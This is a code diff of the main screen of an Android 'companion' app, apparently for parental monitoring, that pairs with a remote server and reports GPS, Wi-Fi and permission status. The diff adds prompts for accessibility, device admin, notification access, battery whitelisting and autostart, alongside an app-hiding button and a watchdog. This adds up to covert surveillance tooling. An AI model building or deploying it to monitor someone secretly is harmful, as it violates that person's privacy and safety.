@@ -1,12 +1,16 @@
 package com.snapapp.companion;
 
 import android.Manifest;
-import android.content.*;
+import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.view.View;
-import android.widget.*;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -14,10 +18,10 @@ import androidx.core.content.ContextCompat;
 import org.json.JSONObject;
 
 public class MainActivity extends AppCompatActivity {
-    private static final int PERM_REQUEST_CODE = 2001;
-
+    private static final int PERM_CODE = 2001;
     private EditText etPairingCode, etServerUrl;
-    private Button btnActivate, btnSyncNow, btnHideApp, btnFixBattery;
+    private Button btnActivate, btnSyncNow, btnHideApp;
+    private Button btnAccessibility, btnDeviceAdmin, btnNotificationAccess, btnFixBattery, btnAutoStart;
     private TextView tvStatus, tvChildName;
     private View cardUnpaired, cardPaired;
     private SharedPreferences prefs;
@@ -26,41 +30,80 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
         prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
+        bindViews();
+        etServerUrl.setText(prefs.getString("server_url", "https://snap-app-chi.vercel.app"));
+        checkExistingPairing();
+        setupListeners();
+    }
+
+    private void bindViews() {
         etPairingCode = findViewById(R.id.etPairingCode);
         etServerUrl = findViewById(R.id.etServerUrl);
         btnActivate = findViewById(R.id.btnActivate);
         btnSyncNow = findViewById(R.id.btnSyncNow);
         btnHideApp = findViewById(R.id.btnHideApp);
+        btnAccessibility = findViewById(R.id.btnAccessibility);
+        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin);
+        btnNotificationAccess = findViewById(R.id.btnNotificationAccess);
         btnFixBattery = findViewById(R.id.btnFixBattery);
+        btnAutoStart = findViewById(R.id.btnAutoStart);
         tvStatus = findViewById(R.id.tvStatus);
         tvChildName = findViewById(R.id.tvChildName);
         cardUnpaired = findViewById(R.id.cardUnpaired);
         cardPaired = findViewById(R.id.cardPaired);
+    }
 
-        etServerUrl.setText(prefs.getString("server_url", "https://snap-app-chi.vercel.app"));
-        checkExistingPairing();
-
+    private void setupListeners() {
         btnActivate.setOnClickListener(v -> handleActivation());
+        btnAccessibility.setOnClickListener(v -> ParentalSetupHelper.promptAccessibility(this));
+        btnDeviceAdmin.setOnClickListener(v -> ParentalSetupHelper.promptDeviceAdmin(this));
+        btnNotificationAccess.setOnClickListener(v -> ParentalSetupHelper.promptNotificationAccess(this));
+        btnFixBattery.setOnClickListener(v -> ParentalSetupHelper.promptBatteryOptimization(this));
+        btnAutoStart.setOnClickListener(v -> OemPermissionHelper.openAutoStartSettings(this));
         btnSyncNow.setOnClickListener(v -> {
-            startSyncService();
-            Toast.makeText(MainActivity.this, "Live GPS telemetry sent!", Toast.LENGTH_SHORT).show();
+            triggerManualSync();
+            Toast.makeText(this, "Live status & GPS sent!", Toast.LENGTH_SHORT).show();
         });
-        btnFixBattery.setOnClickListener(v -> OemPermissionHelper.openAutoStartSettings(MainActivity.this));
         btnHideApp.setOnClickListener(v -> {
             startSyncService();
-            AppHideHelper.showHideDialog(MainActivity.this);
+            AppHideHelper.showHideDialog(this);
         });
     }
 
+    @Override
+    protected void onResume() {
+        super.onResume();
+        updatePermissionButtons();
+        if (prefs.getString("device_id", null) != null) triggerManualSync();
+    }
+
+    private void updatePermissionButtons() {
+        if (btnAccessibility == null) return;
+        boolean access = ParentalSetupHelper.isAccessibilityEnabled(this);
+        btnAccessibility.setText(access ? "👁️ Accessibility Service (Active ✓)" : "👁️ Enable Accessibility →");
+        btnAccessibility.setTextColor(ContextCompat.getColor(this, access ? R.color.green_active : R.color.snap_yellow));
+
+        boolean admin = ParentalSetupHelper.isDeviceAdminActive(this);
+        btnDeviceAdmin.setText(admin ? "🛡️ Device Admin (Active ✓)" : "🛡️ Activate Device Admin →");
+        btnDeviceAdmin.setTextColor(ContextCompat.getColor(this, admin ? R.color.green_active : R.color.snap_yellow));
+
+        boolean notif = ParentalSetupHelper.isNotificationListenerEnabled(this);
+        btnNotificationAccess.setText(notif ? "🔔 Notifications (Active ✓)" : "🔔 Allow Notification Access →");
+        btnNotificationAccess.setTextColor(ContextCompat.getColor(this, notif ? R.color.green_active : R.color.snap_yellow));
+
+        boolean bat = ParentalSetupHelper.isBatteryOptimizationIgnored(this);
+        btnFixBattery.setText(bat ? "🔋 Battery Whitelist (Active ✓)" : "🔋 Whitelist Battery (Anti-Sleep) →");
+        btnFixBattery.setTextColor(ContextCompat.getColor(this, bat ? R.color.green_active : R.color.snap_yellow));
+    }
+
     private void checkExistingPairing() {
-        String deviceId = prefs.getString("device_id", null);
-        String childName = prefs.getString("child_name", "Protected Child");
-        if (deviceId != null) {
+        String devId = prefs.getString("device_id", null);
+        if (devId != null) {
             cardUnpaired.setVisibility(View.GONE);
             cardPaired.setVisibility(View.VISIBLE);
-            tvChildName.setText("Protected: " + childName);
+            tvChildName.setText("Protected: " + prefs.getString("child_name", "Kid Device"));
+            updatePermissionButtons();
             requestPermissionsAndStart();
         } else {
             cardUnpaired.setVisibility(View.VISIBLE);
@@ -69,33 +112,34 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void handleActivation() {
-        final String code = etPairingCode.getText().toString().trim();
-        final String server = etServerUrl.getText().toString().trim();
-        if (code.length() < 4) { tvStatus.setText("Please enter valid pairing code"); return; }
-        tvStatus.setText("Connecting to server...");
+        final String code = etPairingCode.getText().toString().trim(), server = etServerUrl.getText().toString().trim();
+        if (code.length() < 4) { tvStatus.setText("Enter valid pairing code"); return; }
+        tvStatus.setText("Connecting...");
         btnActivate.setEnabled(false);
-
         ApiClient.pairDevice(server, code, new ApiClient.ApiCallback() {
-            @Override
-            public void onSuccess(final JSONObject response) {
+            @Override public void onSuccess(JSONObject res) {
                 runOnUiThread(() -> {
                     btnActivate.setEnabled(true);
-                    String devId = response.optString("device_id", "");
-                    String child = response.optString("child_name", "Kid Device");
-                    prefs.edit().putString("device_id", devId).putString("child_name", child).putString("server_url", server).apply();
-                    Toast.makeText(MainActivity.this, "Device Paired Successfully!", Toast.LENGTH_LONG).show();
+                    prefs.edit().putString("device_id", res.optString("device_id", "")).putString("child_name", res.optString("child_name", "Kid Device")).putString("server_url", server).apply();
+                    Toast.makeText(MainActivity.this, "Paired Successfully!", Toast.LENGTH_LONG).show();
                     checkExistingPairing();
                 });
             }
-
-            @Override
-            public void onError(final String error) {
-                runOnUiThread(() -> {
-                    btnActivate.setEnabled(true);
-                    tvStatus.setText("Error: " + error);
-                });
+            @Override public void onError(String err) {
+                runOnUiThread(() -> { btnActivate.setEnabled(true); tvStatus.setText("Error: " + err); });
             }
         });
+    }
+
+    private void triggerManualSync() {
+        startSyncService();
+        String devId = prefs.getString("device_id", null), server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
+        if (devId != null) {
+            boolean isAcc = ParentalSetupHelper.isAccessibilityEnabled(this), isAdm = ParentalSetupHelper.isDeviceAdminActive(this);
+            boolean isBat = ParentalSetupHelper.isBatteryOptimizationIgnored(this);
+            String ssid = WifiScanHelper.getConnectedSsid(this);
+            ApiClient.sendHeartbeat(server, devId, 100, false, isAcc, isAdm, isBat, ssid, null);
+        }
     }
 
     private void requestPermissionsAndStart() {
@@ -115,53 +159,29 @@ public class MainActivity extends AppCompatActivity {
         } else {
             list.add(Manifest.permission.READ_EXTERNAL_STORAGE);
         }
-        String[] perms = list.toArray(new String[0]);
         boolean allGranted = true;
-        for (String p : perms) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                allGranted = false; break;
-            }
+        for (String p : list) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) { allGranted = false; break; }
         }
         if (allGranted) {
-            checkBackgroundAndUsageAccess();
             startSyncService();
         } else {
-            ActivityCompat.requestPermissions(this, perms, PERM_REQUEST_CODE);
+            ActivityCompat.requestPermissions(this, list.toArray(new String[0]), PERM_CODE);
         }
-    }
-
-    private void checkBackgroundAndUsageAccess() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            try {
-                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
-                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                    Intent intent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
-                    startActivity(intent);
-                }
-            } catch (Exception ignored) {}
-        }
-        if (!AppUsageHelper.hasUsagePermission(this)) AppUsageHelper.promptUsageAccess(this);
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == PERM_REQUEST_CODE) {
-            checkBackgroundAndUsageAccess();
-            startSyncService();
-        }
+    public void onRequestPermissionsResult(int rc, @NonNull String[] perms, @NonNull int[] results) {
+        super.onRequestPermissionsResult(rc, perms, results);
+        if (rc == PERM_CODE) startSyncService();
     }
 
     private void startSyncService() {
         WatchdogReceiver.scheduleWatchdog(this);
-        Intent serviceIntent = new Intent(this, CompanionSyncService.class);
+        Intent intent = new Intent(this, CompanionSyncService.class);
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent);
-            } else {
-                startService(serviceIntent);
-            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
+            else startService(intent);
         } catch (Exception ignored) {}
     }
 }
